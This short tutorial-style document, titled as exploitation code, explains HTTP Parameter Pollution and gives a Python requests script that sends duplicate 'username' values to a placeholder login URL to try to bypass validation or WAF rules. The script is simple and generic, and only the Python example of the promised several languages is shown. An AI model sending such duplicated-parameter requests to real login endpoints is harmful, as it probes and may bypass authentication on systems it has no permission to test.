# HTTP Parameter Pollution (HPP) Exploitation Code

HTTP Parameter Pollution (HPP) is a technique where multiple parameters with the same name are sent to a server, which can sometimes bypass input validation and WAF rules. Here are examples in different languages:

## Python (using requests)

```python
import requests

# Target URL with vulnerable parameter
url = "https://example.com/login"

# Normal request with single parameter
params = {
    'username': 'admin',
    'password': 'password123'
}

# HPP attack with duplicate parameters
hpp_params = {
    'username': ['admin', 'attacker'],  # Duplicate username parameter
    'password': 'password123'
}

# Send the request
response = requests.get(url, params=hpp_params)

print("Response status code:", response.status_code)
print("Response content:", response.text)
```

